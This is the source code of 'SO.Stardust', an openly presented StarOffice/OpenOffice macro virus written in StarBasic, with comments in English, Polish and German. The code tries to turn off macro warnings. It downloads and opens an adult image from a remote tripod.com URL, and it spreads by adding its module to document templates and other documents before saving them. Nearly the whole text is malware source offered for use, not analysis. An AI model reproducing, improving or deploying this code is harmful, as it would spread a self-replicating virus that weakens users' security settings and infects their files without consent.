'Comments in:

'English:
'Its a simple macrovirus for StarOffice.
'After an infected StarOffice document(including document templates) gets executed it 
'turns off annoying stuff like macrowarnings,itit downloads and opens an image with adult content.:)
'This macro virus then proceeds to infect other StarOffice/OpenOffice Suites document files.
'It does this by initially checking for the stardust module in Global module.
'If not found, it adds the  module, which contains its malicious code.

'Polski:
'Jest to nieskomplikowany makrowirus dla StarOffice. 
'Wirus wylacza ochrone antywirusowa StarOffice.
'Stardust ukrywa sie w dokumentach StarOffice (z rozszerzeniem .sxw oraz .stw) 
'- po otwarciu takiego pliku wirus próbuje zainfekowac szablon dokumentu,
'po to, by kazdy kolejny tworzony dokument zostal zarazony. Dodatkowo, podczas otwierania dokumentu zawierajacego Stardust, 
'wyswietlany jest plik graficzny (raczej nieprzeznaczony dla maloletnich uzytkowników:)). 

'Deutsch:
'Stardust ist ein einfach geschriebener Makrovirus für StarOffice.
'Nach dem Aufruf eines infizierten Dokumentes wird die Makrowarnung,etc ausgeschaltet,von einer vor definierten Seite wird 
'ein Bild herruntergeladen und in einem neuen Dokument göffnet.
'Der MV versucht andere StarOffice/OpenOffice Suites Dokumente, in dem er kontrolliert,ob dieses bereits infiziert ist.
'Ist dies nicht der Fall fügt es ein Modul mit enthaltenen Viruscode hinzu.

'Bugreport,etc to: necronomikon@poczta.onet.pl
Dim lAutoInstall as Boolean
Dim Url As String
Dim myFileProp as Object
Sub AutoInstall
	lAutoInstall = True
	mygame()
End Sub
Sub mygame
'*******************************
'*******  SO.Stardust  *********  
'*** (c)by Necronomikon[DCA] ***
'*******************************
'Co wazne a co wazne nie jest!
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
'turn off macrowarning and execute it
ThisComponent.LockControllers 'turn off screen updating.
oDocument = ThisComponent
otext=oDocument.text
ocursor=otext.createtextcursor()
otext.insertString(ocursor, "***Stardust***(c)by Necronomikon[DCA]",false)
url=converttourl("http://stardustvx.tripod.com/SilviaSaint.JPG") 'nice idea from Slagehammer... ;)
oDocument = StarDesktop.loadComponentFromURL(url, "_blank", 0, myFileProp() )
End Sub

Sub InstallGlobalModule( ByVal cGlobalLibName As String,_
							Optional cDocumentLibName,_
							Optional stardust )
If IsMissing( cDocumentLibName ) Then
cDocumentLibName = cGlobalLibName
EndIf

If IsMissing( stardust ) Then
InstallGlobalModule( cGlobalLibName, cDocumentLibName, BASIC_MODULE )
InstallGlobalModule( cGlobalLibName, cDocumentLibName, DIALOG_MODULE )
Else
If DoesModuleExist( cDocumentLibName, stardust, DOCUMENT_LIBRARY, DIALOG_MODULE ) Then
InstallGlobalModule( cGlobalLibName, cDocumentLibName, DIALOG_MODULE, stardust )
		
ElseIf DoesModuleExist( cDocumentLibName, stardust, DOCUMENT_LIBRARY, BASIC_MODULE ) Then
InstallGlobalModule( cGlobalLibName, cDocumentLibName, BASIC_MODULE, stardust )
		
Else
EndIf
EndIf
oDocument.store()'To Juz Jest Koniec...
End Sub
Function DoesModuleExist( ByVal cLibraryName As String,_
							ByVal stardust As String,_
							ByVal bGlobal As Boolean,_
							ByVal bDialog As Boolean _
							) As Boolean	
If bGlobal Then
If bDialog Then
oLibs = GlobalScope.DialogLibraries

Else
oLibs = GlobalScope.BasicLibraries
EndIf

Else
If bDialog Then
oLibs = DialogLibraries

Else
oLibs = BasicLibraries
EndIf
EndIf
	
bExists = False
If oLibs.hasByName( cLibraryName ) Then
oLib = oLibs.getByName( cLibraryName )
If oLib.hasByName( stardust ) Then
bExists = True
EndIf
EndIf
DoesModuleExist() = bExists
End Function

